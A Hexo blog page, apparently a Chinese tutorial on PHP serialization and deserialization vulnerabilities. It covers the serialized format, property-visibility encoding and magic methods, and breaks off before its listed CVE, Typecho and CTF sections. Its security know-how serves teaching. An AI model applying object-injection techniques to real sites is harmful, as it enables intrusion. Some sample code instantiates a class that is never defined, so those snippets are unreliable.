@@ -1,0 +1,763 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="UTF-8">
+    
+    <link rel="apple-touch-icon" sizes="76x76" href="/null">
+    <link rel="icon" type="image/png" href="/null">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <title>php反序列化 - Hexo</title>
+    
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    
+    
+    <meta name="description" content="">
+    <meta name="author" content="John Doe">
+    <meta name="keywords" content="">
+    <style>
+
+
+    
+    :root{
+        --shadow-color: rgba(0,0,0,0.2);
+        --sec-shadow: rgba(0,0,0,0.03);
+        --shadow-hover-color: rgba(0,0,0,0.28);
+        --first-text-color: #475b6d;
+        --second-text-color: #37475b;
+        --third-text-color: #858585;
+        --default-text-color: #505050;
+        --default-link-color: #007bff;
+        --link-color: #000000;
+        --second-link-color: #4F9BFA;
+        --code-color:rgba(27,31,35,.05);
+        --post-bkg-color: #fff;
+        --page-bkg-color: #f2f5f8;
+        --nav-a-hover-color: #3498db;
+        --post-sec-text-color: #718096;
+        --sec-bkg: #f2f5f8;
+        --color-mode: 'light';
+        --bkg-h: rgba(255,255,255,0.6);
+        --bkg-m: #e1e4e8;
+        --home-title-color: #4169E1;
+        --shadow: 0 4px 10px rgba(0,2,4,0.06),0 0 1px rgba(0,2,4,0.11);
+        --hr-color: #ddd;
+        --bg-t: #f4f4f4;
+        --nav-bkg: rgba(255,255,255,0.6);
+    }
+
+@media (prefers-color-scheme: dark) {
+  :root {
+    --color-mode: 'dark';
+  }
+
+  :root:not([data-theme]) {
+    --first-text-color: hsla(0,0%,100%,0.92);
+    --second-text-color: hsla(0,0%,100%,0.86);
+    --third-text-color: #a7a9ad;
+    --default-text-color: #505050;
+    --default-link-color: #1589e9;
+    --link-color: #000000;
+    --second-link-color: #30a9de;
+    --post-bkg-color: #252d38;
+    --page-bkg-color: #181c27;
+    --nav-a-hover-color: #3498db;
+    --post-sec-text-color: #a7a9ad;
+    --sec-bkg: #364151;
+    --bkg-h: rgba(255,255,255,0.2);
+    --bkg-m: rgba(255,255,255,0.1);
+    --home-title-color: rgb(226, 82, 90);
+    --code-color:#3e4b5e;
+    --shadow: none;
+    --hr-color: #718096;
+    --bg-t: #364151;
+    --nav-bkg: rgba(13,17,23,0.6);
+  }
+}
+
+[data-theme='dark'] {
+    --shadow-color: rgba(0,0,0,0.2);
+    --shadow-hover-color: rgba(0,0,0,0.28);
+    --first-text-color: hsla(0,0%,100%,0.92);
+    --second-text-color: hsla(0,0%,100%,0.86);
+    --third-text-color: #a7a9ad;
+    --default-text-color: #505050;
+    --default-link-color: #1589e9;
+    --link-color: #000000;
+    --second-link-color: #30a9de;
+    --post-bkg-color: #252d38;
+    --page-bkg-color: #181c27;
+    --nav-a-hover-color: #3498db;
+    --post-sec-text-color: #a7a9ad;
+    --sec-bkg: #364151;
+    --bkg-h: rgba(255,255,255,0.2);
+    --bkg-m: rgba(255,255,255,0.1);
+    --home-title-color: rgb(226, 82, 90);
+    --code-color:#3e4b5e;
+    --shadow: none;
+    --hr-color: #718096;
+    --bg-t: #364151;
+    --nav-bkg: rgba(13,17,23,0.6);
+}
+
+</style>
+
+
+
+<style>
+#page-main,footer,.p-btn{
+    display: none;
+}
+html,body{
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    height: 100%;
+    overflow-y: overlay;
+}
+body{
+    background-color: var(--page-bkg-color);
+    color: var(--second-text-color);
+    overflow-y: scroll;
+}
+a {
+    color: var(--default-link-color);
+    text-decoration: none;
+    background-color: transparent;
+}
+a:hover{
+    color: var(--second-link-color);
+}
+.main-content,.post-card-main{
+    margin: 30px;
+}
+
+
+
+@media (max-width: 410px){
+    .post-card-main{
+        max-width: 350px!important;
+    }
+}
+
+@media (max-width: 980px){
+    .post-card-main{
+        max-width: 520px!important;
+    }
+}
+
+
+@media (min-width: 780px){ 
+    h3{
+        font-size: 1.5rem;
+        line-height: 1.5em;
+    }
+}
+@media (min-width: 1280px){ 
+    h3{
+        font-size: 1.7rem;
+        line-height: 1.5em;
+    }
+}
+@media (min-width: 2096px){ 
+    h3{
+        font-size: 1.8rem;
+        line-height: 1.5em;
+    }
+}
+
+.text-center{
+    text-align: center!important;
+}
+.middle-center{
+    display: -webkit-box;
+    display: -ms-flexbox;
+    display: flex;
+    -webkit-box-align: center;
+    -ms-flex-align: center;
+    align-items: center;
+    -webkit-box-pack: center;
+    -ms-flex-pack: center;
+    justify-content: center;
+    height: 100%;
+}
+header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    position: fixed;
+    height: 54px;
+    padding: 0 1.25rem;
+    top: 0;
+    left: 0;
+    right: 0;
+    z-index: 10;
+    border-bottom: 1px solid var(--bkg-m);
+    background-color: var(--nav-bkg);
+}
+header .header__left, header .header__right {
+    display: flex;
+    align-items: center;
+    font-family: rubik,sans-serif,Varela Round;
+}
+header .header__left .logo__text {
+    font-size: 18px;
+    font-weight: 450;
+    padding: 14.5px 10px;
+    border-radius: 5px;
+    color: var(--second-text-color);
+}
+header .header__right .navbar__menus {
+    height: 54px;
+    padding: 0 0 0 15px;
+}
+header .header__right .button {
+    color: var(--second-text-color);
+}
+header .header__right .navbar__menus .navbar-menu {
+    display: inline-block;
+    align-items: center;
+    height: 54px;
+    padding: 0 10px;
+    font-size: 16px;
+    line-height: 54px;
+}
+header .header__right .dropdown-icon {
+    display: none;
+    height: 54px;
+    padding: 15px 10px;
+    border: 0;
+    background-color: transparent;
+}
+header .header__right .dropdown-menus {
+    line-height: 2rem;
+    animation: slide-in .15s ease 1;
+    display: none;
+    position: absolute;
+    left: 12px;
+    right: 12px;
+    top: calc(54px + 10px);
+    border-radius: 6px;
+    padding: 24px;
+    background-color: var(--page-bkg-color);
+    border: 1px solid var(--bkg-m);
+    z-index: 9999;
+    justify-items: center;
+    justify-content: center;
+    flex-direction: column;
+}
+header .header__right #btn-search, header .header__right #btn-toggle-dark{
+    display: inline-block;
+    padding:  18px 10px;
+    height: 25px;
+}
+header .header__right #btn-dropdown{
+  display: inline-block;
+  padding:  13.5px 0;
+}
+header .header__right .dropdown-menus .dropdown-menu {
+    padding: 10px;
+    color: var(--second-text-color);
+}
+@media screen and (max-width: 764px){
+.navbar__menus {
+    display: none!important;
+}
+.dropdown-icon {
+    display: inline-block!important;
+}
+}
+.p-btn{
+    position: fixed;
+    bottom: 1.2rem;
+    right: 1.2rem;
+    contain: layout;
+}
+.toc-btn,.click-btn{
+    cursor: pointer;
+    -webkit-appearance: none;
+    -moz-appearance: none;
+    appearance: none;
+    align-items: center;
+    margin-top: .5rem;
+    font-size: .75rem;
+    background-color: var(--sec-bkg);
+    display: block;
+    padding: 0.9rem;
+    box-shadow: 0 0.3rem 0.6rem rgba(48,55,66,.15);
+    border: none;
+    border-radius: 0.5rem;
+    line-height: 1;
+    color: var(--first-text-color);
+}
+.toc-link{
+    color: var(--second-text-color);
+}
+
+#css-loading h3{
+    font-weight: 500;
+    font-size: 1.4rem;
+    text-align: center;
+    position: fixed;
+    top: 200px;
+    left: 0;
+    right: 0;
+    opacity: 0;
+    animation: cssLoad;
+    animation-delay: 0.3s;
+    -webkit-animation: cssLoad;
+    -webkit-animation-delay: 0.3s;
+}
+@keyframes cssLoad {
+    from {
+        opacity: 0;
+    }
+    to {
+        opacity: 0.9;
+    }
+}
+
+
+.memorial {
+    -webkit-filter: grayscale(100%);
+    -moz-filter: grayscale(100%);
+    -ms-filter: grayscale(100%);
+    -o-filter: grayscale(100%);
+    filter: grayscale(100%);
+    filter:progid:DXImageTransform.Microsoft.BasicImage(grayscale=1); filter:gray;
+}
+
+
+</style>
+
+    
+
+    
+        <!--
+        <link rel="stylesheet" href="/css/page.css" media="print"
+            onload="this.media='all';this.onload=null">
+        <noscript>-->
+            <link rel="stylesheet" href="/css/page.css">
+        <!--</noscript>-->
+    
+    
+    <link rel="stylesheet" href="/css/main.css" media="print" onload="this.media='all';this.onload=null">
+    <noscript>
+        <link rel="stylesheet" href="/css/main.css">
+    </noscript>
+
+    
+    <script src="/js/main.js"></script>
+    
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+    <body>
+        <header>
+            
+<div class="header__left">
+	<a href="/" class="button"><span class="logo__text">不恰葡萄干的博客</span></a>
+</div>
+<div class="header__right">
+	<div class="navbar__menus">
+		
+	</div>
+	
+	<a href="/search/" class="button">
+		<div id="btn-search">
+			<svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 1024 1024" width="24" height="24" fill="currentColor"
+				stroke="currentColor" stroke-width="32">
+				<path
+					d="M192 448c0-141.152 114.848-256 256-256s256 114.848 256 256-114.848 256-256 256-256-114.848-256-256z m710.624 409.376l-206.88-206.88A318.784 318.784 0 0 0 768 448c0-176.736-143.264-320-320-320S128 271.264 128 448s143.264 320 320 320a318.784 318.784 0 0 0 202.496-72.256l206.88 206.88 45.248-45.248z">
+				</path>
+			</svg>
+		</div>
+	</a>
+	
+	<a href="javaScript:void(0);" class="button" id="btn-toggle-dark">
+		<div>
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none"
+				stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+				<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+			</svg>
+		</div>
+	</a>
+	<a href="javaScript:void(0);" class="dropdown-icon button">
+		<div id="btn-dropdown">
+			<svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 1024 1024" width="24" height="24" fill="currentColor"
+				stroke="currentColor" stroke-width="32" stroke-linecap="round">
+				<path
+					d="M903.43 561.52H148.8c-13.25 0-24-10.75-24-24s10.75-24 24-24h754.63c13.25 0 24 10.75 24 24s-10.75 24-24 24zM903.43 204.31H148.8c-13.25 0-24-10.75-24-24s10.75-24 24-24h754.63c13.25 0 24 10.75 24 24s-10.75 24-24 24zM903.43 918.73H148.8c-13.25 0-24-10.75-24-24s10.75-24 24-24h754.63c13.25 0 24 10.75 24 24s-10.75 24-24 24z"
+					fill="currentColor"></path>
+			</svg>
+		</div>
+	</a>
+	<div class="dropdown-menus" id="dropdown-menus">
+		
+	</div>
+</div>
+
+        </header>
+        <div id="top"></div>
+        <div id="page-main" class="main-content">
+        <div class="mg-top">
+            
+
+<article class="page">
+<div id="post-meta-m">
+    <div class="post-meta" id="post-meta">
+  <h3>php反序列化</h3>
+    
+      <span class="post-meta-label">
+        John Doe
+      </span>
+    
+    
+      <span class="post-meta-label">
+        <span class="p-dot"></span>
+        <time datetime="2022-05-07 13:58" pubdate>
+          2022-05-07
+        </time>
+      </span>
+    
+    
+      
+      <span class="post-meta">
+        <span class="p-dot"></span>
+        共 4.9k 字
+      </span>
+    
+    
+    
+  </div>
+  
+</div>
+<div class="article-m">
+  <div class="post-toc">
+    
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text">基本概念</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">反序列化漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2016-7124"><span class="toc-number">3.</span> <span class="toc-text">CVE-2016-7124</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">Typecho反序列化漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bugku-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%92%8CPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9ECTF%E7%BB%83%E4%B9%A0%E9%A2%98"><span class="toc-number">5.</span> <span class="toc-text">bugku 文件包含和PHP反序列化漏洞CTF练习题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="toc-number">6.</span> <span class="toc-text">PHP反序列化漏洞的防御</span></a></li></ol>
+    
+  </div>
+    <div id="article">
+      <div id="post-content" class="markdown-body textretty">
+        <h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>序列化（串行化）：将变量转换为可保存或传输的字符串的过程；</p>
+<p>反序列化（反串行化）：在适当的时候把这个字符串再转化成原来的变量使用。</p>
+<p>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。常见的php系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode。</p>
+<p>string serialize ( mixed $value )返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方。</p>
+<p>数据类型:长度:名字:属性个数{数据类型:长度:名称1;数据类型:长度:值1;}</p>
+<p>mixed unserialize ( string $str )对单一的已序列化的变量进行操作，将其转换回 PHP 的值。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// 序列化</span></span><br><span class="line"><span class="comment">//定义一个类，类名是chybeta</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;</span><br><span class="line">  <span class="comment">//定义一个变量</span></span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$test</span> = <span class="number">123</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//new一个对象，实例化</span></span><br><span class="line"><span class="variable">$class1</span> = <span class="keyword">new</span> chybeta;</span><br><span class="line"><span class="comment">//序列化创建的对象</span></span><br><span class="line"><span class="variable">$class1_ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$class1</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$class1_ser</span>);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>文件名code1.php，输出结果：O:7:”chybeta”:1:{s:4:”test”;i:123;}  </p>
+<p>其中，O表示对象，7表示对象名chybeta的长度，chybeta是对象名，1表示有1个属性，{  }里面的参数有key和value，s表示是string对象，4表示长度，test是key，i表示是integer对象，123是value</p>
+<p>可见PHP的序列化与JSON数据类似，将各种类型的数据，压缩并按照一定的格式储存起来，这样也方便传输。</p>
+<p>在PHP中对不同类型的数据用不同的字母来标识：</p>
+<p>a - array<br>b - boolean<br>d - double<br>i - integer<br>o - common object<br>r - reference<br>s - string<br>C - custom object<br>O - class<br>N - null<br>R - pointer reference<br>U - unicode string</p>
+<p>N 表示的是 NULL，而 b、d、i、s 表示的是四种标量类型，目前其它语言所实现的 PHP 序列化程序基本上都实现了对这些类型的序列化和反序列化，不过有一些实现中对 s （字符串）的实现存在问题。</p>
+<p>a、O 属于最常用的复合类型，大部分其他语言的实现都很好的实现了对 a 的序列化和反序列化，但对 O 只实现了 PHP4 中对象序列化格式，而没有提供对 PHP 5 中扩展的对象序列化格式的支持。</p>
+<p>r、R 分别表示对象引用和指针引用，这两个也比较有用，在序列化比较复杂的数组和对象时就会产生带有这两个标示的数据，后面我们将详细讲解这两个标示，目前这两个标示尚没有发现有其他语言的实现。</p>
+<p>C 是 PHP5 中引入的，它表示自定义的对象序列化方式，尽管这对于其它语言来说是没有必要实现的，因为很少会用到它，但是后面还是会对它进行详细讲解的。</p>
+<p>U 是 PHP6 中才引入的，它表示 Unicode 编码的字符串。因为 PHP6 中提供了 Unicode 方式保存字符串的能力，因此它提供了这种序列化字符串的格式，不过这个类型 PHP5、PHP4 都不支持，而这两个版本目前是主流，因此在其它语言实现该类型时，不推荐用它来进行序列化，不过可以实现它的反序列化过程。在后面我也会对它的格式进行说 明。</p>
+<p>o标示在 PHP3 中被引入用来序列化对象，到了 PHP4 以后就被 O 取代了。在 PHP3 的源代码中可以看到对 o 的序列化和反序列化与数组 a 基本上是一样的。但是在 PHP4、PHP5 和 PHP6 的源代码中序列化部分里都找不到它。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span> = <span class="string">&#x27;cream&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> <span class="title class_">demo</span>();</span><br><span class="line"><span class="variable">$uns</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$object</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$uns</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>文件名code2.php，测试结果：O:4:”demo”:1:{s:10:”demotest”;s:5:”cream”;}</p>
+<p>注意：源代码中的属性名为,但是经过序列化后却变成了demotest，并且属性名的长度为10，不符合预期。这里涉及到 <strong>PHP 的属性的访问权限问题</strong></p>
+<p>我们知道属性访问权限有三个：private、protected、public，测试这三个属性的情况：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test2</span> = <span class="string">&#x27;pentester&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$test3</span> = <span class="string">&#x27;redhat&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> <span class="title class_">test</span>();</span><br><span class="line"><span class="variable">$uns</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$object</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$uns</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>文件名code3.php，测试结果：O:4:”demo”:3:{s:4:”test”;s:6:”hacker”;s:11:”demotest2”;s:9:”pentester”;s:8:”*test3”;s:6:”redhat”; </p>
+<p>（1）public，该属性序列化后的结果正常，在预期之内；</p>
+<p>（2）private，私有权限，也就是说该属性只能由类使用，为了区别，在序列化后，private属性会在自己的名字前面加上自己所属的类名，也即变成了demotest2，但是其长度为啥是11呢？写到文件使用HEXDUMP查看便知。</p>
+<p><img src="https://secure2.wostatic.cn/static/oSapZyDWTbEYDRuzFi8kNP/image.png"></p>
+<p>根据结果表明：私有属性在序列后类名前后均有%00，也即**%00类名%00属性名**</p>
+<p>（3）protected，该属性和private有些类似，但是长度怎么计算呢？看上图便知！protected在序列化时序列化后的结果是**%00*%00属性名**</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test2</span> = <span class="string">&#x27;pentester&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$test3</span> = <span class="string">&#x27;redhat&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test4</span>(<span class="params"><span class="variable">$test</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test4 = <span class="variable">$test</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test5</span>(<span class="params"><span class="variable">$test</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> <span class="title class_">test</span>();</span><br><span class="line"><span class="variable">$uns</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$object</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$uns</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>文件名code4.php，测试结果：O:4:”demo”:3:{s:4:”test”;s:6:”hacker”;s:11:”demotest2”;s:9:”pentester”;s:8:”*test3”;s:6:”redhat”;}</p>
+<p>发现和code3.php的测试结果一样，说明定义的方法不影响序列化的结果，总之：<strong>序列化只序列化属性，不序列化方法</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义一个类user</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="comment">//定义两个变量</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$age</span>=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="comment">//定义一个方法</span></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">PrintDate</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;User &#x27;</span>.<span class="variable language_">$this</span>-&gt;name.<span class="string">&#x27; is &#x27;</span>.<span class="variable language_">$this</span>-&gt;age.<span class="string">&#x27; years old.&lt;br /&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line"><span class="comment">/*$xiaoming=new User();</span></span><br><span class="line"><span class="comment">$xiaoming-&gt;age=20;</span></span><br><span class="line"><span class="comment">$xiaoming-&gt;name=”zhangxiaoming”;</span></span><br><span class="line"><span class="comment">$xiaoming-&gt;PrintDate();*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> =<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;i:20;s:4:&quot;name&quot;;s:13:&quot;zhangxiaoming&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="comment">//调用PrintDate函数</span></span><br><span class="line"><span class="title function_ invoke__">Var_dump</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="variable">$user</span>-&gt;<span class="title function_ invoke__">PrintDate</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>文件名code5.php，测试结果：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">object(User)#1 (2) &#123;</span><br><span class="line">  [&quot;age&quot;]=&gt;</span><br><span class="line">  int(20)</span><br><span class="line">  [&quot;name&quot;]=&gt;</span><br><span class="line">  string(13) &quot;zhangxiaoming&quot;</span><br><span class="line">&#125;</span><br><span class="line">User zhangxiaoming is 20 years old.<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意：</p>
+<ol>
+<li>在反序列化的过程中必须保证当前作用域下类是存在的，否则无法完成反序列化操作。</li>
+<li>反序列化之后的对象在文件执行结束后就会被销毁</li>
+</ol>
+<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>PHP的反序列化漏洞又可以叫做 <strong>PHP对象注入漏洞</strong>，这种思想类似SQL注入，在unserialize接受的参数可控的情况下，通过注入我们可控的属性值，来控制类中的方法的执行，从而造成安全隐患。</p>
+<p><strong>魔法函数</strong></p>
+<p>php类可能会包含一些特殊的函数叫magic函数，magic函数命名是以符号__开头的，比如 __construct, __destruct, __toString, __sleep, __wakeup等等。这些函数在某些情况下会自动调用。</p>
+<p>__construct(构造函数)当一个对象创建时被调用；</p>
+<p>__destruct（析构函数）当一个对象销毁时被调；</p>
+<p>__toString当一个对象被当作一个字符串使用；</p>
+<p>__sleep magic方法在一个对象被序列化的时候调用；</p>
+<p>__wakeup magic方法在一个对象被反序列化的时候调用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义一个类，名为TestClass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="comment">//定义一个变量</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$variable</span>=<span class="string">&#x27;this is a string!&#x27;</span>;</span><br><span class="line">  <span class="comment">//定义一个方法</span></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">PrintVariable</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;variable.<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;__construct&lt;br /&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;__destruct&lt;br /&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;__toString&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建一个对象</span></span><br><span class="line"><span class="comment">//__construct会被调用</span></span><br><span class="line"><span class="variable">$object</span> =<span class="keyword">new</span> <span class="title class_">TestClass</span>();</span><br><span class="line"><span class="comment">//调用对象下的方法</span></span><br><span class="line"><span class="variable">$object</span>-&gt;<span class="title function_ invoke__">PrintVariable</span>();</span><br><span class="line"><span class="comment">//对象被当做一个字符串</span></span><br><span 